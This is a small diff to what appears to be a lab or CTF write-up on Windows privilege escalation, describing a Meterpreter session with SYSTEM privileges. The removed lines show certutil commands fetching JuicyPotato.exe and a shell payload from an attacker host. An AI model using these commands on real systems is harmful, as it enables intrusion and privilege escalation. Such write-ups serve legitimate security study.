@@ -98,13 +98,6 @@ whoami /priv
 
 **Outcome**: Obtained a Meterpreter session with `NT AUTHORITY\SYSTEM` privileges.
 
-```
-certutil -UrlCache -f http://10.10.16.9:8081/JuicyPotato.exe jp.exe
-
-certutil -UrlCache -f http://10.10.16.9:8081/shell.exe s.exe
-```
-
-
 ***
 
 ## Resources
